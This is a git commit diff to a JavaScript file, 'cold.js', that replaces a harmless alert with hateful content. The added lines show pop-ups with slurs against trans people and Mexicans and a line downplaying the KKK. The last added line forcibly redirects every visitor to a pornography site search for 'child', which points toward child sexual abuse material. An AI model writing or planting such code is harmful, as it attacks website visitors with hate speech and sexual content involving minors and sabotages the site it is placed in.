befacc27cbc6aad8db4d82d7f2602c16b0959b1f
cyanide <ariez@ariez.wtf>
2025-01-25 20:49:07 +0000

    Update cold.js

--- cold.js
+++ cold.js
@@ -1,1 +1,4 @@
-alert('dawg what ')
+alert('THE KKK DID NOTHING ')
+alert('FUCK TRANS PEOPLE | FAGGOT SWAGGOT')
+alert('WE LOVE ICE FUCK THEM MEXICANS')
+window.location.replace("https://www.pornhub.com/video/search?search=child");
